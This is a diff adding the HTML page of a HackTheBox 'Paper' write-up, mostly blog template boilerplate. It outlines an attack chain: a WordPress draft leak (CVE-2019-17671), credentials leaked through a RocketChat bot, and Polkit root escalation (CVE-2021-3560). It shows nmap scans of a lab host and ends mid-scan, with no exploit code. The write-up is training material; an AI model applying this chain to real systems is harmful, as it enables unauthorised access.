@@ -1,0 +1,5552 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- `site.alt_lang` can specify a language different from the UI -->
+<html lang="en" >
+  <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta
+    name="viewport"
+    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
+  ><!-- Setup Open Graph image -->
+
+  
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="HackTheBox - Paper" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="HackTheBox &quot;Paper&quot; wirteup is now available!" />
+<meta property="og:description" content="HackTheBox &quot;Paper&quot; wirteup is now available!" />
+<link rel="canonical" href="http://localhost:4000/posts/paper/" />
+<meta property="og:url" content="http://localhost:4000/posts/paper/" />
+<meta property="og:site_name" content="0xbro" />
+<meta property="og:image" content="http://localhost:4000/assets/img/Paper/Paper.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-06-19T00:00:00+02:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/img/Paper/Paper.png" />
+<meta property="twitter:title" content="HackTheBox - Paper" />
+<meta name="twitter:site" content="@sec_0xbro" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-19T00:00:00+02:00","datePublished":"2022-06-19T00:00:00+02:00","description":"HackTheBox &quot;Paper&quot; wirteup is now available!","headline":"HackTheBox - Paper","image":"http://localhost:4000/assets/img/Paper/Paper.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/paper/"},"url":"http://localhost:4000/posts/paper/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <title>HackTheBox - Paper | 0xbro
+  </title>
+
+  <!--
+  Custom Favicons - using favicon.ico only
+-->
+
+<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">
+
+  <!-- Resource Hints -->
+  
+    
+      
+        <link rel="preconnect" href="https://fonts.googleapis.com" >
+      
+        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      
+        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      
+        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+      
+    
+  
+
+  <!-- Bootstrap -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
+  
+
+  <!-- Theme style -->
+  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
+
+  <!-- Web Font -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">
+
+  <!-- 3rd-party Dependencies -->
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
+  
+
+  
+    <!-- Image Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
+  
+
+  <!-- Scripts -->
+
+  <script src="/assets/js/dist/theme.min.js"></script>
+
+  <!-- JS selector for site. -->
+
+<!-- commons -->
+
+
+
+<!-- layout specified -->
+
+
+  
+
+  
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>
+
+
+
+
+
+
+
+<script defer src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- Pageviews -->
+
+  
+
+  
+
+
+
+  
+
+  <!-- A placeholder to allow defining custom metadata -->
+
+</head>
+
+
+  <body>
+    <!-- The Side Bar -->
+
+<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
+  <header class="profile-wrapper">
+    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>
+
+    <a class="site-title d-block" href="/">0xbro</a>
+    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
+  </header>
+  <!-- .profile-wrapper -->
+
+  <nav class="flex-column flex-grow-1 w-100 ps-0">
+    <ul class="nav">
+      <!-- home -->
+      <li class="nav-item">
+        <a href="/" class="nav-link">
+          <i class="fa-fw fas fa-home"></i>
+          <span>HOME</span>
+        </a>
+      </li>
+
+      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
+      
+        
+          <li class="nav-item">
+            <a href="/about/" class="nav-link">
+              <i class="fa-fw fas fa-info-circle"></i>
+              <span>ABOUT</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/timeline/" class="nav-link">
+              <i class="fa-fw fas fa-timeline"></i>
+              <span>TIMELINE</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/disclosure/" class="nav-link">
+              <i class="fa-fw fas fa-handshake"></i>
+              <span>DISCLOSURE</span>
+            </a>
+          </li>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+
+      <!-- Separator -->
+      <li class="nav-item nav-separator">
+        <hr class="sidebar-divider">
+      </li>
+
+      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
+      
+        
+      
+        
+      
+        
+      
+        
+          <li class="nav-item">
+            <a href="/categories/" class="nav-link">
+              <i class="fa-fw fas fa-stream"></i>
+              <span>CATEGORIES</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/projects/" class="nav-link">
+              <i class="fa-fw fas fa-code"></i>
+              <span>PROJECTS</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/tags/" class="nav-link">
+              <i class="fa-fw fas fa-tags"></i>
+              <span>TAGS</span>
+            </a>
+          </li>
+        
+      
+        
+          <li class="nav-item">
+            <a href="/archives/" class="nav-link">
+              <i class="fa-fw fas fa-archive"></i>
+              <span>ARCHIVES</span>
+            </a>
+          </li>
+        
+      
+    </ul>
+  </nav>
+
+  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
+    
+      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
+        <i class="fas fa-adjust"></i>
+      </button>
+
+      
+        <span class="icon-border"></span>
+      
+    
+
+    
+
+      
+        <a
+          href="https://github.com/0xb120"
+          aria-label="github"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+
+      
+        <a
+          href="https://twitter.com/sec_0xbro"
+          aria-label="twitter"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fa-brands fa-x-twitter"></i>
+        </a>
+      
+    
+          
+      
+
+      
+        <a
+          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
+          aria-label="linkedin"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-linkedin"></i>
+        </a>
+      
+    
+          
+        
+
+      
+        <a
+          href="/feed.xml"
+          aria-label="rss"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-rss"></i>
+        </a>
+      
+    
+  </div>
+  <!-- .sidebar-bottom -->
+</aside>
+<!-- #sidebar -->
+
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div class="container d-flex flex-column px-xxl-5">
+        <!-- The Top Bar -->
+
+<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
+  <div
+    id="topbar"
+    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
+  >
+    <nav id="breadcrumb" aria-label="Breadcrumb">
+      
+
+      
+        
+          
+            <span>
+              <a href="/">Home</a>
+            </span>
+
+          
+        
+          
+        
+          
+            
+              <span>HackTheBox - Paper</span>
+            
+
+          
+        
+      
+    </nav>
+    <!-- endof #breadcrumb -->
+
+    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
+      <i class="fas fa-bars fa-fw"></i>
+    </button>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
+      <i class="fas fa-search fa-fw"></i>
+    </button>
+
+    <search id="search" class="align-items-center ms-3 ms-lg-0">
+      <i class="fas fa-search fa-fw"></i>
+      <input
+        class="form-control"
+        id="search-input"
+        type="search"
+        aria-label="search"
+        autocomplete="off"
+        placeholder="Search..."
+      >
+    </search>
+    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
+  </div>
+</header>
+
+
+        <div class="row flex-grow-1">
+          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              <!-- Refactor the HTML structure -->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Change the icon of checkbox -->
+
+
+
+<!-- Handle images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- return -->
+
+
+
+
+
+
+
+
+
+
+<article class="px-1" data-toc="true">
+  <header>
+    <h1 data-toc-skip>HackTheBox - Paper</h1>
+    
+      <p class="post-desc fw-light mb-4">HackTheBox &quot;Paper&quot; wirteup is now available!</p>
+    
+
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1655589600"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Jun 19, 2022
+</time>
+
+      </span>
+
+      <!-- lastmod date -->
+      
+
+      
+        
+        
+        
+
+        
+
+        <div class="mt-3 mb-3">
+          <a href="/assets/img/Paper/Paper.png" class="popup img-link preview-img shimmer"><img src="/assets/img/Paper/Paper.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
+              <a href="https://twitter.com/sec_0xbro">0xbro</a>
+            
+          </em>
+        </span>
+
+        <div>
+          <!-- pageviews -->
+          
+
+          <!-- read time -->
+          <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="3392 words"
+>
+  <em>18 min</em> read</span>
+
+        </div>
+      </div>
+    </div>
+  </header>
+
+  
+    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
+      <span class="label text-truncate">HackTheBox - Paper</span>
+      <button type="button" class="toc-trigger btn me-1">
+        <i class="fa-solid fa-list-ul fa-fw"></i>
+      </button>
+    </div>
+
+    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
+      <span class="label ps-2 pe-1">Contents</span>
+      <i class="fa-solid fa-angle-right fa-fw"></i>
+    </button>
+
+    <dialog id="toc-popup" class="p-0">
+      <div class="header d-flex flex-row align-items-center justify-content-between">
+        <div class="label text-truncate py-2 ms-4">HackTheBox - Paper</div>
+        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
+          <i class="fas fa-close"></i>
+        </button>
+      </div>
+      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
+    </dialog>
+  
+
+  <div class="content">
+    <h2 id="resolution-summary"><span class="me-2">Resolution summary</span><a href="#resolution-summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<ul>
+  <li>A server response from the HTTP web server discloses a DNS that points to a Wordpress blog vulnerable to <strong>Unauthenticated View Private/Draft Posts</strong> (CVE-2019-17671)</li>
+  <li>Exploiting the vulnerability we are able to <strong>leak</strong> restricted data, containing a <strong>secret registration token for RocketChat</strong> that allows us to create a custom user and access a restricted chat</li>
+  <li>On RocketChat it is possible to exploit some insecure functionalities of a custom bot in order to <strong>leaks recyclops credentials</strong> and <strong>reuse</strong> them to access the machine as dwight</li>
+  <li>The machine is vulnerable to <strong>Polkit Privilege Escalation</strong> (CVE-2021-3560). It is possible to create a custom sudoer account and thus escalate to root.</li>
+</ul>
+
+<h3 id="improved-skills"><span class="me-2">Improved skills</span><a href="#improved-skills" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<ul>
+  <li>Enumeration and exploitations of leaked secrets</li>
+  <li>Exploiting Wordpress known vulnerabilities</li>
+  <li>Abusing intended features lacking of security controls</li>
+  <li>Exploitation of Polkit Privilege Escalation</li>
+</ul>
+
+<h3 id="used-tools"><span class="me-2">Used tools</span><a href="#used-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<ul>
+  <li>nmap</li>
+  <li>gobuster</li>
+  <li>wpscan</li>
+  <li>linpeas.sh</li>
+</ul>
+
+<hr />
+
+<h2 id="information-gathering"><span class="me-2">Information Gathering</span><a href="#information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Scanned all TCP ports:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> 10.10.11.143 <span class="nt">-v</span> <span class="nt">-oN</span> scan/all-tcp-ports.txt
+
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-07 17:24 EDT
+Initiating Ping Scan at 17:24
+Scanning 10.10.11.143 <span class="o">[</span>4 ports]
+...
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.85 seconds
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Enumerated open TCP ports:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80,443 10.10.11.143 <span class="nt">-oN</span> scan/open-tcp-ports.txt
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-07 17:25 EDT
+Nmap scan report <span class="k">for </span>10.10.11.143
+Host is up <span class="o">(</span>0.040s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.37 <span class="o">((</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9<span class="o">)</span>
+|_http-generator: HTML Tidy <span class="k">for </span>HTML5 <span class="k">for </span>Linux version 5.7.28
+|_http-title: HTTP Server Test Page powered by CentOS
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
+443/tcp open  ssl/http Apache httpd 2.4.37 <span class="o">((</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9<span class="o">)</span>
+|_http-title: HTTP Server Test Page powered by CentOS
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-generator: HTML Tidy <span class="k">for </span>HTML5 <span class="k">for </span>Linux version 5.7.28
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>Unspecified/countryName<span class="o">=</span>US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn:
+|_  http/1.1
+|_http-server-header: Apache/2.4.37 <span class="o">(</span>centos<span class="o">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.17 seconds
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Enumerated top 200 UDP ports:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Paper]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">--top-ports</span> 200 10.10.11.143 <span class="nt">-oN</span> scan/top_200-udp-ports.txt
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-07 17:39 EDT
+Nmap scan report <span class="k">for </span>10.10.11.143
